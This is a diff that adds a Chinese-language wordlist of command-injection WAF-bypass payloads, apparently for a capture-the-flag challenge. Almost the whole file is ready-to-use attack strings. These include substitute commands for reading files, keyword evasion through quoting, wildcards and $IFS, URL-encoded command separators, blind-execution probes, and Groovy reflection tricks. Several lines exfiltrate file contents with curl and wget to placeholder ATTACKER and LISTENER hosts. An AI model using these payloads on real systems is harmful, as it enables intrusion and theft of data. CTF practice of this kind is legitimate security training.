@@ -1,0 +1,78 @@
+# 命令注入 WAF 绕过用词：同义命令 + 关键字破坏写法。
+# 用法：把 TARGET 换成本题里能执行的位置；每条都是「整条参数值」的候选。
+# 同义读文件（cat 被拦时）
+tac TARGET
+head TARGET
+head -c 9999 TARGET
+tail -n 100 TARGET
+more TARGET
+less TARGET
+nl TARGET
+od -c TARGET
+od -An -t x1 TARGET
+xxd TARGET
+strings TARGET
+awk 1 TARGET
+sed -n 1,999p TARGET
+paste TARGET
+sort TARGET
+uniq TARGET
+base64 TARGET
+grep . TARGET
+cut -c1- TARGET
+# 列目录
+find . -maxdepth 1
+find / -name *flag*
+printf '%s\n' *
+echo /*
+ls -la
+dir
+# 绕关键字：反斜杠 / 空引号 / 通配符 / 路径变形
+c\at TARGET
+c''at TARGET
+c""at TARGET
+/bin/c?t TARGET
+/???/??t TARGET
+/bin/c[a]t TARGET
+t\ac TARGET
+h''ead TARGET
+# 变量拼接
+a=ca;b=t;$a$b TARGET
+X=cat;$X TARGET
+# 分隔符变形
+%0a
+%0d%0a
+${IFS}
+$IFS$9
+;
+%3b
+|
+%7c
+&&
+%26%26
+# 无回显外带
+curl http://ATTACKER/$(cat TARGET | base64 -w0)
+wget -qO- http://ATTACKER/`head -c 200 TARGET`
+sleep 5
+# 运行期「字面命令名黑名单」（cat/ls/find 被拦但引号破坏可过）
+c''at TARGET
+l''s /DIR
+f''ind /DIR -maxdepth 2 -name PATTERN
+/???/c?t TARGET
+# 路径被拦但通配符可用
+cat /DIR/*
+head -n 999 /DIR/*
+# 无空格（执行器按空白切分参数时）
+sh -c cat${IFS}TARGET
+sh -c cp${IFS}SRC${IFS}DST
+sh -c test${IFS}-e${IFS}TARGET&&cp${IFS}/bin/true${IFS}/tmp/probe
+# 盲执行探针（存在性 oracle：可执行文件才算成立）
+rm -f /tmp/probe
+test -e TARGET && cp /bin/true /tmp/probe
+# 方法名被过滤时的反射等价（JVM / Groovy 类执行器）
+'id'.invokeMethod('exe'+'cute', null).text
+'id'."exe${'cute'}"().text
+Eval.me("'id'.exe" + "cute().text")
+# 外带（不出网时的替代：写进应用会读的目录）
+curl --data-binary @TARGET http://LISTENER/
+cp TARGET STATIC_DIR/OUT.txt
